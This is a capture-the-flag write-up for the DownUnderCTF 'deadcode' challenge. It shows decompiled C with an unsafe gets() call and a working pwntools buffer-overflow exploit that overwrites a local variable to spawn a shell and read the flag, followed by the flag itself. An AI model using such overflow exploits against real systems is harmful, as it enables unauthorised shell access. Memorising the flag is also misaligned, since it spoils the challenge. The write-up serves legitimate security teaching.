#### Challenge:

I'm developing this new application in C, I've setup some code for the new features but it's not (a)live yet. [deadcode](./deadcode ":ignore")

`nc pwn-2021.duc.tf 31916`

---

#### Solution:

- decompiling reveals that via overwriting local value to `0xdeadc0de` we gain shell

```c
void main(void)
{
  char local_28 [24];
  long local_10;
  
  local_10 = 0;
  buffer_init();
  puts(
      "\nI\'m developing this new application in C, I\'ve setup some code for the new features but it\'s not (a)live yet."
      );
  puts("\nWhat features would you like to see in my app?");
  gets(local_28);
  if (local_10 == 0xdeadc0de) {
    puts("\n\nMaybe this code isn\'t so dead...");
    system("/bin/sh");
  }
  return 0;
}
```

```python
#!/usr/bin/env python3

from pwn import *
from struct import *

r = remote('pwn-2021.duc.tf', 31916)

print(r.recvline().decode('utf-8').strip())
print(r.recvline().decode('utf-8').strip())


payload = b'A'*(24) + pack("<Q", 0xdeadc0de)

r.sendline(payload)
print(r.recvuntil(b'...').decode('utf-8').strip())
r.sendline(b'cat flag.txt; echo;')
print(r.recvuntil(b'}').decode('utf-8').strip())
r.close()
```

---

<details><summary>FLAG:</summary>

```
DUCTF{y0u_br0ught_m3_b4ck_t0_l1f3_mn423kcv}
```

</details>
<br/>
